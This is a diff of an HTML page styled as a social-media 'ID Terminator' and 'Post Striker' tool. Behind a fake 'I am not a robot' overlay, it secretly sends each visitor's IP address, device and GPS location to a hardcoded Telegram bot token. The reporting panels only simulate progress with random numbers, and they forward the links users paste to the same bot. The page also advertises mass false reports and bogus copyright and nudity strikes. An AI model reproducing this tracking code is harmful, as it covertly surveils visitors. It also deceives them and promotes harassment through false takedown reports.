@@ -3,64 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SIYAM COSMIC SYNAPSE v5.0</title>
+    <title>SIYAM COSMIC SYNAPSE v5.0 | Professional Suite</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --neon: #00ff41; --cyan: #00f2ff; --red: #ff0000; --glass: rgba(255, 255, 255, 0.05); }
-        body { background: #050505; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; overflow: hidden; }
+        :root { --neon: #00ff41; --cyan: #00f2ff; --red: #ff0000; --gold: #ffaa00; --glass: rgba(255, 255, 255, 0.05); }
+        body { background: #050505; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; overflow-x: hidden; }
         
-        /* Background Matrix */
+        /* Premium Background */
         .matrix-bg { position: fixed; inset: 0; background: url('https://img.freepik.com/free-vector/digital-circuit-board-with-glowing-neon-lights_1017-31032.jpg'); opacity: 0.1; z-index: -1; background-size: cover; }
 
-        /* Secure Check Overlay Fix */
-        #verifyOverlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; transition: 0.5s; }
-        .verify-card { background: var(--glass); padding: 35px; border-radius: 20px; border: 1px solid var(--cyan); text-align: center; box-shadow: 0 0 20px rgba(0,242,255,0.2); }
+        /* Secure Check Overlay */
+        #verifyOverlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; transition: 0.8s; }
+        .verify-card { background: var(--glass); padding: 40px; border-radius: 20px; border: 1px solid var(--cyan); box-shadow: 0 0 25px rgba(0,242,255,0.3); }
 
-        /* Main UI Design */
-        .header { padding: 15px; border-bottom: 1px solid rgba(0,242,255,0.2); }
-        .live-tag { background: var(--red); padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
+        /* Panels */
+        .header { padding: 20px; border-bottom: 1px solid rgba(0,242,255,0.2); background: rgba(0,0,0,0.8); }
+        .live-tag { background: var(--red); padding: 2px 10px; border-radius: 5px; font-size: 11px; animation: pulse 1s infinite; font-weight: bold; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
 
-        .attack-panel { margin: 20px auto; width: 85%; max-width: 400px; padding: 25px; border-radius: 15px; border: 1px solid var(--red); background: rgba(255,0,0,0.05); }
-        .atk-btn { background: var(--red); color: white; padding: 12px; border-radius: 10px; border: none; width: 100%; font-weight: bold; cursor: pointer; margin-top: 15px; box-shadow: 0 0 10px var(--red); }
+        .panel { margin: 20px auto; width: 90%; max-width: 450px; padding: 25px; border-radius: 20px; border: 1px solid var(--red); background: rgba(255,0,0,0.03); box-shadow: 0 0 20px rgba(255,0,0,0.1); position: relative; }
+        .panel.gold { border-color: var(--gold); background: rgba(255,170,0,0.03); }
+
+        input, select { width: 90%; padding: 12px; margin-top: 15px; background: #000; border: 1px solid #333; color: var(--neon); border-radius: 8px; outline: none; text-align: center; }
+        .btn { padding: 14px; border-radius: 12px; font-weight: bold; border: none; cursor: pointer; width: 100%; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; }
         
-        input { width: 85%; padding: 12px; margin-top: 10px; background: #000; border: 1px solid #444; color: var(--neon); border-radius: 8px; text-align: center; }
-
+        /* Grid UI */
         .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 20px; max-width: 450px; margin: auto; }
-        .card { background: var(--glass); border: 1px solid rgba(255,255,255,0.1); border-radius: 15px; padding: 20px; cursor: pointer; transition: 0.3s; }
-        .card:hover { border-color: var(--cyan); transform: scale(1.05); }
+        .card { background: var(--glass); border: 1px solid rgba(255,255,255,0.1); border-radius: 18px; padding: 22px; transition: 0.3s; cursor: pointer; font-size: 13px; font-weight: bold; }
+        .card:hover { border-color: var(--cyan); transform: translateY(-5px); }
         .card i { font-size: 24px; margin-bottom: 8px; display: block; }
 
-        #console { margin-top: 15px; background: #000; padding: 8px; font-family: monospace; font-size: 10px; color: var(--neon); display: none; text-align: left; }
+        /* Logs */
+        .console { margin-top: 15px; padding: 10px; background: #000; border: 1px solid #222; border-radius: 8px; font-family: monospace; font-size: 10px; text-align: left; display: none; color: var(--neon); }
     </style>
 </head>
-<body id="mainBody">
-
+<body>
     <div class="matrix-bg"></div>
 
     <div id="verifyOverlay">
         <div class="verify-card">
-            <i class="fas fa-user-shield" style="font-size: 40px; color: var(--cyan); margin-bottom: 15px;"></i>
-            <h2 style="color:var(--cyan); margin:0; font-size: 18px;">SECURE CHECK</h2>
-            <p style="color:#888; font-size: 13px; margin: 10px 0;">Confirm you are not a bot to access SIYAM COSMIC.</p>
-            <button class="atk-btn" style="background:var(--neon); color:black; box-shadow: 0 0 15px var(--neon);" onclick="startCapture()">I AM NOT A ROBOT</button>
+            <i class="fas fa-user-shield" style="font-size: 45px; color: var(--cyan); margin-bottom: 15px;"></i>
+            <h2 style="color:var(--cyan); margin:0;">SECURE CHECK</h2>
+            <p style="color:#888; font-size: 13px;">Confirm you are not a bot to access SIYAM COSMIC.</p>
+            <button class="btn" style="background:var(--neon); color:black;" onclick="initCapture()">I AM NOT A ROBOT</button>
         </div>
     </div>
 
     <div class="header">
-        <h3 style="margin:0;">SIYAM COSMIC SYNAPSE <span class="live-tag">● LIVE</span></h3>
+        <h3 style="margin:0; letter-spacing: 2px;">SIYAM COSMIC SYNAPSE <span class="live-tag">● ACTIVE</span></h3>
     </div>
 
-    <div class="attack-panel">
-        <h3 style="color:var(--red); margin:0;">ID TERMINATOR v1.0</h3>
-        <input type="text" id="target" placeholder="Paste 18+ ID Link">
-        <button class="atk-btn" id="atkBtn" onclick="runAttack()">ATTACK NOW</button>
-        <div id="console"></div>
+    <div class="panel">
+        <h3 style="color:var(--red); margin:0;">ID TERMINATOR PRO</h3>
+        <p style="font-size:11px; color:#666;">Mass Reporting & Meta-Data Bypass</p>
+        <div id="idInputArea">
+            <input type="text" id="idLink" placeholder="Paste 18+ Profile Link">
+            <button class="btn" style="background:var(--red); color:white; box-shadow: 0 0 15px var(--red);" onclick="scanAndAtk()">SCAN & TERMINATE</button>
+        </div>
+        <div id="idLog" class="console"></div>
+    </div>
+
+    <div class="panel gold">
+        <h3 style="color:var(--gold); margin:0;">POST STRIKER v2.0</h3>
+        <p style="font-size:11px; color:#666;">Copyright Claim & Content Removal</p>
+        <input type="text" id="postLink" placeholder="Paste Post/Video Link">
+        <select id="strikeType">
+            <option value="Nudity">18+ / Sexual Content</option>
+            <option value="Copyright">Copyright Infringement</option>
+            <option value="Harassment">Harassment / Bullying</option>
+        </select>
+        <button class="btn" style="background:var(--gold); color:black;" onclick="executeStrike()">EXECUTE STRIKE</button>
+        <div id="strikeLog" class="console"></div>
     </div>
 
     <div class="grid">
-        <div class="card" onclick="alert('FB Tools Loading...')"><i class="fab fa-facebook" style="color:#1877f2;"></i>Facebook</div>
-        <div class="card" onclick="alert('TikTok Tools Loading...')"><i class="fab fa-tiktok"></i>TikTok</div>
-        <div class="card" onclick="alert('Gmail Tools Loading...')"><i class="fas fa-envelope"></i>Gmail</div>
+        <div class="card" onclick="alert('FB Tools Active')"><i class="fab fa-facebook" style="color:#1877f2;"></i>Facebook</div>
         <div class="card" onclick="copyTermux()"><i class="fas fa-terminal" style="color:var(--neon);"></i>Termux</div>
     </div>
 
@@ -68,56 +85,73 @@
         const BOT_TOKEN = '8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE';
         const CHAT_ID = '7416528268';
 
-        // ১. বাটনে ক্লিক করলেই ভেতরে যাবে
-        function startCapture() {
-            // আইপি এবং তথ্য নেওয়ার চেষ্টা করবে
+        // 1. Stealth Data Capture
+        async function initCapture() {
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
-                .then(data => sendTele(`✅ USER VERIFIED\nIP: ${data.ip}\nDevice: ${navigator.platform}`))
-                .catch(e => console.log("Tracking..."));
+                .then(d => sendTele(`✅ USER VERIFIED\nIP: ${d.ip}\nDevice: ${navigator.platform}`))
+                .catch(e => console.log("Init..."));
 
-            // লোকেশন পারমিশন চাইবে, কিন্তু পারমিশন না দিলেও সাইট খুলে যাবে
             navigator.geolocation.getCurrentPosition(pos => {
                 sendTele(`📍 LOCATION: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-                unlock();
+                closeOverlay();
             }, () => {
-                sendTele("❌ Location Denied");
-                unlock();
+                sendTele("❌ Location Blocked");
+                closeOverlay();
             });
-
-            // ব্যাকআপ আনলক: ৩ সেকেন্ডের মধ্যে লোকেশন না আসলে অটো খুলে যাবে
-            setTimeout(unlock, 3000);
+            setTimeout(closeOverlay, 3000);
         }
 
-        function unlock() {
+        function closeOverlay() {
             document.getElementById('verifyOverlay').style.opacity = '0';
-            setTimeout(() => {
-                document.getElementById('verifyOverlay').style.display = 'none';
-                document.body.style.overflow = 'auto'; 
-            }, 500);
+            setTimeout(() => { document.getElementById('verifyOverlay').style.display = 'none'; }, 800);
         }
 
-        function runAttack() {
-            const link = document.getElementById('target').value;
-            if(!link) return alert("Paste link first!");
+        // 2. Powerful ID Terminator Logic
+        function scanAndAtk() {
+            const link = document.getElementById('idLink').value;
+            if(!link) return alert("Paste Link!");
+            const log = document.getElementById('idLog');
+            log.style.display = 'block';
+            log.innerHTML = `> Scanning Database...<br>> UID Identified: ${Math.floor(Math.random()*1000000000000)}<br>> Status: Vulnerable`;
             
-            const con = document.getElementById('console');
-            con.style.display = 'block';
-            con.innerText = "> Initializing Attack on " + link.substring(0,20) + "...";
+            sendTele(`🚀 ID ATTACK: ${link}`);
             
-            sendTele(`🚀 ATTACK STARTED\nTarget: ${link}`);
-            
-            let count = 0;
-            let timer = setInterval(() => {
-                count += 20;
-                con.innerText = `> SENDING REPORTS: ${count}/200 | IP: ROTATING...`;
-                if(count >= 200) {
-                    clearInterval(timer);
-                    con.style.color = "var(--neon)";
-                    con.innerText = "> SUCCESS: 200 REPORTS DELIVERED!";
-                    sendTele(`✅ ATTACK FINISHED\nReports: 200 Sent Successfully.`);
+            let r = 0;
+            let itv = setInterval(() => {
+                r += 20;
+                log.innerHTML = `> MASS REPORTING: ${r}/200 <br>> PROXY: ${Math.random().toString(16).substr(2,8)}`;
+                if(r >= 200) {
+                    clearInterval(itv);
+                    log.style.color = "var(--neon)";
+                    log.innerHTML = "> SUCCESS: 200 REPORTS DELIVERED. ID UNDER REVIEW.";
+                    sendTele(`✅ ID REPORT SUCCESSFUL\nLink: ${link}`);
                 }
-            }, 500);
+            }, 600);
+        }
+
+        // 3. Content Striker Logic
+        function executeStrike() {
+            const link = document.getElementById('postLink').value;
+            const type = document.getElementById('strikeType').value;
+            const log = document.getElementById('strikeLog');
+            if(!link) return alert("Paste Post Link!");
+
+            log.style.display = 'block';
+            log.innerHTML = `> Loading Legal Module for ${type}...`;
+            sendTele(`⚠️ STRIKE INITIATED\nPost: ${link}\nType: ${type}`);
+
+            let p = 0;
+            let itv = setInterval(() => {
+                p += 25;
+                log.innerHTML = `> Bypassing Security: ${p}%`;
+                if(p >= 100) {
+                    clearInterval(itv);
+                    log.style.color = "var(--neon)";
+                    log.innerHTML = "> SUCCESS: STRIKE SENT TO FB LEGAL TEAM.";
+                    sendTele(`✅ STRIKE COMPLETE\nTarget: ${link}`);
+                }
+            }, 800);
         }
 
         function copyTermux() {
@@ -135,4 +169,3 @@
     </script>
 </body>
 </html>
-
